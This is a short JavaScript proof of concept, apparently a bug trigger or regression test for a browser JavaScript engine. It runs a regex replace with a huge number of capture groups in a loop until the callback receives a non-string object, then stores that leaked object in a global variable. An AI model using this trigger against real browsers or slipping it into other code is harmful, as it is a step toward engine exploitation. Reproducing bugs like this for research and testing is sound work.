if (typeof(window) !== 'undefined') {
    print = function(msg) {
        console.log(msg);
    }
}

function i_want_to_break_free() {
    var n = 0x40000;
    var m = 10;
    var regex = new RegExp("(ab)".repeat(n), "g");
    var part = "ab".repeat(n);
    var s = (part + "|").repeat(m);

    while (true) {
        var cnt = 0;
        var ary = [];

        s.replace(regex, function() {
            print('----------------------------------- ' + cnt + ' -----------------------------------');
            for (var i = 1; i < arguments.length-2; ++i) {
                if (typeof arguments[i] !== 'string') {
                    print("FOUND IT");
                    i_am_free = arguments[i];
                    throw "success";
                }
                ary[cnt++] = arguments[i];
            }
            return "x";
        });
    }
}

try {
    i_want_to_break_free();
} catch (e) { }
print('OK');
print(typeof(i_am_free));
